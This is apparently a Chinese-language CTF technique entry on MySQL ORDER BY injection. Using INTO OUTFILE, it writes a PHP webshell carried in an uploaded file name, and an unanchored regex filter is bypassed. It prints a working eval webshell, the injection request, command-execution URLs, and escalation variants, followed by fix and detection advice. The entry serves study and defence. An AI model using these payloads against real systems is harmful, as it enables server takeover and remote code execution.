---
id: web-generic-sqli-order-by-into-outfile-filename-webshell
title: ORDER BY 注入 INTO OUTFILE 写 webshell：上传文件名承载 PHP 代码 + 正则未锚点绕过
type: scenario
domain: web
path: web/generic/sqli
technique: order-by-into-outfile-filename-webshell
aliases:
- ORDER BY 注入
- INTO OUTFILE webshell
- 正则未锚点绕过
- upload_time INTO OUTFILE
- 文件名 getshell
- MySQL 写文件
- sqlupload
tags:
- sqli
- mysql
- order-by
- into-outfile
- webshell
- file-write
- regex-bypass
- upload
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V195
  verified_at: '2026-11-06T23:11:52+08:00'
  notes: 已对照原文核对；preg_match 未锚点、ORDER BY INTO OUTFILE、文件名承载 PHP 与截图一致；未复跑。
---

## 一句话结论

当列表接口把用户可控的 `order` 参数直接拼进 `ORDER BY`，且只用未锚点正则（如 `/upload_time|id/`）做“包含”检查时，可以在 `order` 中追加 `INTO OUTFILE '/var/www/html/shell1.php'`，让 MySQL 把查询结果写入 Web 根目录；查询结果里包含攻击者上传时的文件名，而文件名本身就是 `<?php @eval($_REQUEST['1']); ?>`，于是写出的文件成为可执行 webshell。

## 原理

- **ORDER BY 注入**：`SELECT id, filename, upload_time FROM uploads ORDER BY $order` 中 `$order` 未使用白名单/参数化；MySQL 允许在 `ORDER BY` 后接 `INTO OUTFILE 'path'`，因此 `upload_time INTO OUTFILE '/var/www/html/shell1.php'` 是合法语句，会把结果集写入文件。
- **未锚点正则绕过**：`preg_match("/upload_time|id/", $order)` 只检查字符串中是否出现 `upload_time` 或 `id`，没有 `^...$` 锚定；payload 以 `upload_time` 开头即可通过，后面可追加任意 SQL。
- **文件名承载 PHP 代码**：上传接口把原始文件名存入 `uploads.filename`；攻击者把文件名设为 `<?php @eval($_REQUEST['1']); ?>`（或包含 PHP 代码的短文件名），查询结果行写入 OUTFILE 时就会包含这段代码。只要 OUTFILE 的文件名是 `.php` 且位于 Web 根目录，访问该文件即执行。
- **为什么不是普通文件上传**：上传接口可能只允许图片/或把文件放到非 Web 目录；这里利用的是“数据库查询结果写文件”能力，绕过了上传目录/后缀限制。写入内容来自数据库中的文件名，而不是上传文件内容本身。
- **前置条件**：MySQL 用户有 `FILE` 权限；`secure_file_priv` 为空或允许目标目录；Web 进程对 `/var/www/html` 可写；`INTO OUTFILE` 目标文件不存在（MySQL 不允许覆盖已存在文件）。
- **原文链路**：先上传一个“文件名为 PHP 代码”的文件，再用 `/getFileList.php?order=upload_time%20INTO%20OUTFILE%20%27/var/www/html/shell1.php%27` 写入 webshell；访问 `shell1.php?1=phpinfo();` 成功执行，最后蚁剑连接执行 `/readFlag` 获取 flag。

## 触发条件

- 后端为 MySQL/MariaDB，列表接口存在 `ORDER BY` 拼接注入，且未使用列名白名单/参数化。
- 过滤仅是未锚点正则或关键字包含检查，payload 可包含允许的词（如 `upload_time`、`id`）。
- 数据库用户具备 `FILE` 权限，`secure_file_priv` 允许写入 Web 目录。
- Web 根目录对数据库/Web 进程可写，目标 `.php` 文件不存在。
- 应用有上传功能且会把原始文件名存入可查询的表（或查询结果中包含可控字符串），用于承载 PHP 代码。

## 利用步骤

1. 确认 `order` 参数可注入：提交 `order=upload_time` 正常，`order=1` 可能报错/排序变化；尝试 `order=upload_time,1`、`order=upload_time DESC` 观察。
2. 确认过滤规则：提交 `order=upload_time INTO OUTFILE '/tmp/x'`，若通过则正则只做包含检查；若被拦，尝试大小写/注释/换行。
3. 上传一个文件名包含 PHP 代码的文件（本例文件名 `<?php @eval($_REQUEST['1']); ?>`），确保文件名被存入 `uploads.filename`。
4. 发送 `order=upload_time INTO OUTFILE '/var/www/html/shell1.php'`，让查询结果写入 Web 根目录；注意目标文件不能已存在，必要时换文件名。
5. 访问 `http://target/shell1.php?1=phpinfo();` 验证执行；用蚁剑/curl 执行命令，读取 `/readFlag` 或 `/flag`。
6. 若 `INTO OUTFILE` 被 `secure_file_priv` 限制，尝试其它可写路径（Web 目录、临时目录 + 文件包含）、`INTO DUMPFILE`（单行）、日志写文件（general_log）等变体。
7. 清理写入的 webshell，避免留下后门。

## PoC

上传文件名（表单中的 filename 字段）：

```text
<?php @eval($_REQUEST['1']); ?>
```

注入请求：

```http
GET /getFileList.php?order=upload_time%20INTO%20OUTFILE%20%27/var/www/html/shell1.php%27 HTTP/1.1
Host: target
```

验证：

```text
http://target/shell1.php?1=phpinfo();
http://target/shell1.php?1=system('cat /flag');
```

后端易受攻击的代码形态：

```php
$order = $_GET['order'] ?? "upload_time";
if (!preg_match("/upload_time|id/", $order)) {   // 未锚点，只检查包含
    json_error("非法的 order 参数", 400);
}
$sql = "SELECT id, filename, upload_time FROM uploads ORDER BY $order";
$result = $mysqli->query($sql);
```

## 变体与关联

- 变体：`ORDER BY` 注入也可用 `extractvalue`/`updatexml` 报错注入、时间盲注、`PROCEDURE ANALYSE` 等；写文件只是其中一种。
- 变体：`INTO OUTFILE` 受 `secure_file_priv` 限制时，可用 `general_log`/`slow_query_log` 写 webshell、`LOAD_FILE` 读文件、UDF 提权等。
- 变体：不依赖上传文件名，可用 `SELECT '<?php ...?>' INTO OUTFILE ...`（需要 UNION/列数匹配）或把 payload 放在其它可控字段。
- 关联：[[web-generic-sqli-mysql-outfile-general-log-webshell]]（general_log 写 webshell）、[[web-generic-sqli-mysql-outfile-filename-clause-injection]]（OUTFILE 文件名子句注入）、[[web-generic-sqli-php-like-double-quote-union-outfile]]（UNION + OUTFILE）、[[web-php-file-upload-...]]（上传链）。
- 边界：列名白名单/参数化、数据库无 FILE 权限、`secure_file_priv` 限制、Web 目录不可写、目标文件已存在、WAF 拦截 `INTO OUTFILE` 时，该链不成立。

## 检测与防御

- **修复**：`ORDER BY` 列名使用白名单映射（`upload_time`/`id` -> 固定列名），绝不拼接用户输入；所有查询参数化。
- **数据库加固**：Web 用户最小权限，撤销 `FILE` 权限；设置 `secure_file_priv` 到受限目录；禁止 `INTO OUTFILE`/`general_log` 写 Web 目录。
- **上传加固**：文件名随机化/重命名，不把原始文件名存入可查询字段；上传目录禁止 PHP 执行（`php_admin_flag engine off` 或独立存储）。
- **检测**：监控 `ORDER BY` 参数中出现 `INTO OUTFILE`、`DUMPFILE`、`LOAD_FILE`、`general_log`、`extractvalue` 等关键字；检测 Web 目录新增 `.php` 文件与数据库连接写入行为；WAF 规则覆盖注释/换行/大小写绕过。
- **响应**：删除写入的 webshell，审计数据库账号权限与 Web 目录文件，轮换凭据并排查横向移动。
